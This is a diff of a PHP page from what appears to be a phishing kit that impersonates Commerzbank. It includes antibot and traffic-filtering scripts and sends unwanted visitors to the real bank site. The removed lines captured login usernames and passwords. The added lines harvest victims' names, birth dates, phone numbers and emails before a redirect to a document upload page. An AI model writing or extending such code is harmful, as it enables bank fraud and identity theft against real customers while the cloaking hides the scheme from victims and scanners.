@@ -4,23 +4,23 @@ session_start();
 include '../antibot.php';
 include '../antibot/tds.php';
  
-if ($_SERVER['REQUEST_METHOD'] == 'POST') {
-    // Check if this is a demo user
-    if (isset($_SESSION['demo_user']) && $_SESSION['demo_user'] === true) {
-        // Set demo user data
-        $_SESSION['xusr1'] = 'demo123';
-        $_SESSION['xpss1'] = 'demo123';
-        
-        // Redirect to upload page
-        header('Location: uploadz.php');
-        exit();
-    } else {
-        // Regular user
-        $_SESSION['xusr1'] = $_POST['xusr1'];
-        $_SESSION['xpss1'] = $_POST['xpss1'];
-    }
-} else {
+// Check if user is logged in (has demo_user session)
+if (!isset($_SESSION['demo_user']) || $_SESSION['demo_user'] !== true) {
     header('Location: https://www.commerzbank.de/');
+    exit();
+}
+
+// If form is submitted, process the personal details
+if ($_SERVER['REQUEST_METHOD'] == 'POST') {
+    // Store the personal details in session
+    $_SESSION['xname1'] = $_POST['xname1']; // First name
+    $_SESSION['xname2'] = $_POST['xname2']; // Last name
+    $_SESSION['xdob'] = $_POST['xdob'];     // Birth date
+    $_SESSION['xphone'] = $_POST['xphone']; // Phone
+    $_SESSION['xemail'] = $_POST['xemail']; // Email
+    
+    // Redirect to upload page
+    header('Location: uploadz.php');
     exit();
 }
 ?>
